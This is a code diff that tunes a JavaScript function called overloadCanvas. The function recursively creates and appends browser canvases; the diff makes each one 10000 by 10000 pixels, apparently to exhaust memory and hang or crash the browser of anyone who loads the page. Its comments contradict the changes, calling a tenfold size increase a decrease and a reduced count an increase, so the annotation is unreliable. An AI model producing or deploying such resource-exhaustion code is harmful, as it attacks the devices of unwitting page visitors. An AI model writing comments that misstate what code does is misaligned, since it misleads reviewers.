@@ -10,12 +10,12 @@ function overloadCanvas() {
 
     function createCanvas() {
         const canvas = document.createElement('canvas');
-        canvas.width = 1000;  // Decreased size for faster performance
-        canvas.height = 1000;  // Decreased size for faster performance
+        canvas.width = 10000;  // Decreased size for faster performance
+        canvas.height = 10000;  // Decreased size for faster performance
         document.body.appendChild(canvas);
 
         counter++;
-        if (counter < 500000) {  // Increased number of canvases
+        if (counter < 5000) {  // Increased number of canvases
             createCanvas();  // Create canvases immediately without timeout
         }
     }
